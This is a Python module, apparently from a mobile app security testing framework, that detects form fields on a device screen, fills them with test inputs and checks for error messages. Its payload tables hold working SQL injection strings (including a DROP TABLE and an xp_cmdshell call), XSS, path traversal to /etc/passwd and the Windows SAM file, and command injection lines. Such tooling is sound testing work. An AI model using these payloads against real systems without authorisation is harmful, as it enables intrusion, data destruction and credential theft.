"""Intelligent form detection and filling with test payloads."""

import re
import logging
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Tuple
from enum import Enum

from ..device.base import DeviceInterface, Element
from .element_finder import ElementFinder

logger = logging.getLogger(__name__)


class PayloadType(Enum):
    """Type of test payload."""
    BENIGN = "benign"           # Normal input
    SQL_INJECTION = "sqli"      # SQL injection
    XSS = "xss"                 # Cross-site scripting
    PATH_TRAVERSAL = "traversal"  # Path traversal
    COMMAND_INJECTION = "cmdi"  # Command injection
    FORMAT_STRING = "format"    # Format string
    LDAP_INJECTION = "ldap"     # LDAP injection
    BUFFER_OVERFLOW = "overflow"  # Long strings


@dataclass
class FormField:
    """Represents a form field with detected type."""
    element: Element
    field_type: str  # 'text', 'password', 'email', 'phone', 'number', 'url', 'search'
    field_name: str  # Semantic name (e.g., 'username', 'password')
    hint_text: Optional[str] = None
    is_required: bool = False
    current_value: Optional[str] = None


@dataclass
class PayloadResult:
    """Result of payload injection."""
    field: FormField
    payload_type: PayloadType
    payload: str
    success: bool
    error_message: Optional[str] = None
    response_indicators: List[str] = field(default_factory=list)


class FormFiller:
    """Detect and fill form fields with various payloads."""

    # Payload sets for different attack types
    PAYLOADS = {
        PayloadType.BENIGN: {
            "text": ["test", "John Doe", "Sample Text", "Hello World"],
            "password": ["Password123!", "TestPass1!", "Secr3t!"],
            "email": ["test@example.com", "user@test.org", "admin@localhost"],
            "phone": ["5551234567", "+1-555-123-4567", "555.123.4567"],
            "url": ["https://example.com", "http://test.com/page"],
            "number": ["42", "100", "0", "-1"],
            "search": ["test", "search query", "find this"],
        },
        PayloadType.SQL_INJECTION: {
            "default": [
                "' OR '1'='1",
                "1' OR '1'='1' --",
                "' OR 1=1--",
                "admin'--",
                "1; DROP TABLE users--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1' AND '1'='1",
                "' OR 'x'='x",
                "1 OR 1=1",
                "'; EXEC xp_cmdshell('dir')--",
            ],
        },
        PayloadType.XSS: {
            "default": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(document.domain)",
                "<body onload=alert(1)>",
                "'><script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "<iframe src='javascript:alert(1)'>",
                "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                "'-alert(1)-'",
            ],
        },
        PayloadType.PATH_TRAVERSAL: {
            "default": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "/etc/passwd%00.jpg",
                "....//....//....//etc/passwd%00",
                "file:///etc/passwd",
                "/data/data/com.app/shared_prefs/",
                "../shared_prefs/preferences.xml",
            ],
        },
        PayloadType.COMMAND_INJECTION: {
            "default": [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
                "$(whoami)",
                "& ping -c 1 localhost",
                "; id",
                "| id",
                "&& id",
                "|| id",
                "; sleep 10",
            ],
        },
        PayloadType.FORMAT_STRING: {
            "default": [
                "%s%s%s%s%s%s%s%s%s%s",
                "%x%x%x%x%x%x%x%x%x%x",
                "%n%n%n%n%n%n%n%n%n%n",
                "%d%d%d%d%d%d%d%d%d%d",
                "AAAA%08x.%08x.%08x.%08x",
            ],
        },
        PayloadType.BUFFER_OVERFLOW: {
            "default": [
                "A" * 100,
                "A" * 500,
                "A" * 1000,
                "A" * 5000,
                "A" * 10000,
            ],
        },
    }

    # Field type detection patterns
    FIELD_TYPE_PATTERNS = {
        "email": [r"email", r"e-mail", r"mail"],
        "password": [r"pass", r"pwd", r"secret", r"credential"],
        "phone": [r"phone", r"mobile", r"cell", r"tel"],
        "url": [r"url", r"link", r"address", r"website"],
        "number": [r"amount", r"quantity", r"count", r"age", r"price"],
        "search": [r"search", r"find", r"query", r"filter"],
        "username": [r"user", r"login", r"account", r"name"],
    }

    def __init__(self, device: DeviceInterface):
        self._device = device
        self._finder = ElementFinder(device)

    def detect_fields(self) -> List[FormField]:
        """Detect all form fields on current screen.

        Returns:
            List of FormField objects with detected types.
        """
        fields = []
        inputs = self._finder.find_input_fields()

        for elem in inputs:
            field_type = self._detect_field_type(elem)
            field_name = self._detect_field_name(elem)

            form_field = FormField(
                element=elem,
                field_type=field_type,
                field_name=field_name,
                hint_text=elem.text if not self._is_value(elem.text) else None,
                is_required=self._detect_required(elem),
                current_value=elem.text if self._is_value(elem.text) else None,
            )
            fields.append(form_field)

        return fields

    def _detect_field_type(self, elem: Element) -> str:
        """Detect the semantic type of a field."""
        # Check resource ID
        check_strings = []
        if elem.resource_id:
            check_strings.append(elem.resource_id.lower())
        if elem.content_desc:
            check_strings.append(elem.content_desc.lower())
        if elem.text:
            check_strings.append(elem.text.lower())

        combined = " ".join(check_strings)

        for field_type, patterns in self.FIELD_TYPE_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.IGNORECASE):
                    return field_type

        return "text"  # Default

    def _detect_field_name(self, elem: Element) -> str:
        """Detect a human-readable name for the field."""
        if elem.content_desc:
            return elem.content_desc

        if elem.resource_id:
            # Extract meaningful name from resource ID
            # e.g., "com.app:id/et_username" -> "username"
            name = elem.resource_id.split("/")[-1] if "/" in elem.resource_id else elem.resource_id
            name = re.sub(r'^(et_|txt_|input_|edt_|tf_)', '', name)
            name = name.replace("_", " ").title()
            return name

        if elem.text and not self._is_value(elem.text):
            return elem.text

        return "Unknown Field"

    def _detect_required(self, elem: Element) -> bool:
        """Detect if field is required."""
        check_strings = []
        if elem.resource_id:
            check_strings.append(elem.resource_id)
        if elem.content_desc:
            check_strings.append(elem.content_desc)
        if elem.text:
            check_strings.append(elem.text)

        combined = " ".join(check_strings).lower()
        return "required" in combined or "*" in combined

    def _is_value(self, text: Optional[str]) -> bool:
        """Check if text looks like an entered value vs hint."""
        if not text:
            return False

        # Hints usually have certain patterns
        hint_indicators = ["enter", "type", "your", "e.g.", "ex.", "hint"]
        text_lower = text.lower()

        for indicator in hint_indicators:
            if indicator in text_lower:
                return False

        # If it's all placeholder-like, it's probably not a value
        if text.startswith(("Enter", "Type", "Your", "@", "example")):
            return False

        return True

    def fill_field(self, field: FormField, value: str) -> bool:
        """Fill a single field with value.

        Args:
            field: FormField to fill.
            value: Value to enter.

        Returns:
            True if field was filled successfully.
        """
        try:
            # Click to focus
            self._device.click(field.element)
            import time
            time.sleep(0.2)

            # Clear existing content
            self._device.clear_text()
            time.sleep(0.1)

            # Enter new value
            return self._device.input_text(value, field.element)

        except Exception as e:
            logger.error(f"Failed to fill field {field.field_name}: {e}")
            return False

    def fill_with_payloads(self, payload_types: Optional[List[PayloadType]] = None,
                           max_payloads: int = 3) -> List[PayloadResult]:
        """Fill all detected fields with test payloads.

        Args:
            payload_types: Types of payloads to use (default: BENIGN + SQLi + XSS).
            max_payloads: Maximum payloads per field.

        Returns:
            List of PayloadResult for each attempt.
        """
        if payload_types is None:
            payload_types = [PayloadType.BENIGN, PayloadType.SQL_INJECTION, PayloadType.XSS]

        results = []
        fields = self.detect_fields()

        for field in fields:
            for payload_type in payload_types:
                payloads = self._get_payloads_for_field(field, payload_type)[:max_payloads]

                for payload in payloads:
                    success = self.fill_field(field, payload)

                    result = PayloadResult(
                        field=field,
                        payload_type=payload_type,
                        payload=payload,
                        success=success,
                    )

                    # Check for error indicators
                    import time
                    time.sleep(0.3)
                    result.response_indicators = self._check_response_indicators()

                    results.append(result)

        return results

    def _get_payloads_for_field(self, field: FormField, payload_type: PayloadType) -> List[str]:
        """Get appropriate payloads for a field type."""
        payload_set = self.PAYLOADS.get(payload_type, {})

        if payload_type == PayloadType.BENIGN:
            # Use field-specific benign payloads
            return payload_set.get(field.field_type, payload_set.get("text", []))
        else:
            # Use attack payloads
            return payload_set.get("default", [])

    def _check_response_indicators(self) -> List[str]:
        """Check for interesting response indicators after input."""
        indicators = []

        # Get visible text
        texts = self._finder.find_visible_text(min_length=5)

        # Look for error messages
        error_patterns = [
            r"error", r"invalid", r"failed", r"denied",
            r"exception", r"syntax", r"unexpected",
            r"sql", r"query", r"database",
        ]

        for text in texts:
            text_lower = text.lower()
            for pattern in error_patterns:
                if re.search(pattern, text_lower):
                    indicators.append(text)
                    break

        return indicators[:5]  # Limit

    def fill_login_form(self, username: str = "test@test.com",
                        password: str = "Password123!") -> Dict[str, bool]:
        """Fill a login form with credentials.

        Args:
            username: Username/email to use.
            password: Password to use.

        Returns:
            Dict of field_name -> success.
        """
        results = {}
        fields = self.detect_fields()

        for field in fields:
            if field.field_type in ["email", "username", "text"]:
                if any(kw in field.field_name.lower() for kw in ["user", "email", "login", "account"]):
                    results[field.field_name] = self.fill_field(field, username)
            elif field.field_type == "password":
                results[field.field_name] = self.fill_field(field, password)

        return results

    def fill_registration_form(self, data: Optional[Dict[str, str]] = None) -> Dict[str, bool]:
        """Fill a registration form with test data.

        Args:
            data: Custom data dict (optional).

        Returns:
            Dict of field_name -> success.
        """
        default_data = {
            "email": "test@example.com",
            "username": "testuser123",
            "password": "TestPass123!",
            "phone": "5551234567",
            "name": "Test User",
            "text": "Test Value",
        }

        if data:
            default_data.update(data)

        results = {}
        fields = self.detect_fields()

        for field in fields:
            if field.field_type in default_data:
                results[field.field_name] = self.fill_field(field, default_data[field.field_type])
            elif "text" in default_data:
                results[field.field_name] = self.fill_field(field, default_data["text"])

        return results

    def inject_xss_payloads(self) -> List[PayloadResult]:
        """Inject XSS payloads into all text fields."""
        return self.fill_with_payloads([PayloadType.XSS])

    def inject_sqli_payloads(self) -> List[PayloadResult]:
        """Inject SQL injection payloads into all text fields."""
        return self.fill_with_payloads([PayloadType.SQL_INJECTION])

    def submit_form(self) -> bool:
        """Try to submit the current form.

        Looks for submit/login/sign in buttons.
        """
        submit_patterns = [
            {"text": "Submit"},
            {"text": "SUBMIT"},
            {"text": "Login"},
            {"text": "LOGIN"},
            {"text": "Log In"},
            {"text": "Sign In"},
            {"text": "SIGN IN"},
            {"text": "Sign Up"},
            {"text": "Register"},
            {"text": "Create Account"},
            {"text": "Send"},
            {"text": "Next"},
            {"text": "Continue"},
            {"resourceId": "submit"},
            {"resourceId": "login"},
        ]

        for pattern in submit_patterns:
            elem = self._device.find_element(**pattern)
            if elem and elem.clickable:
                self._device.click(elem)
                import time
                time.sleep(1.0)
                return True

        # Try pressing enter as fallback
        return self._device.press_enter()
